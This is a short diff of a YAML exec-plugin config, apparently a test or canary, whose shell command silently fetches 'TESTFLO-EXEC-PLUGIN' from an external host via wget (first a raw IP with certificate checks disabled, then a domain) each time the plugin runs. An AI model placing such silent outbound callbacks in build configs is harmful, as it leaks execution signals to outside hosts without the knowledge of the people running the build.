@@ -8,4 +8,4 @@ metadata:
         path: /bin/sh
         args:
           - -c
-          - "wget -q -O- https://82.165.195.38/TESTFLO-EXEC-PLUGIN --no-check-certificate || true; echo '{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"testflo-exec-out\"}}'"
+          - "wget -q -O- https://sfg.0x79.de/TESTFLO-EXEC-PLUGIN || true; echo '{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"testflo-exec-out\"}}'"
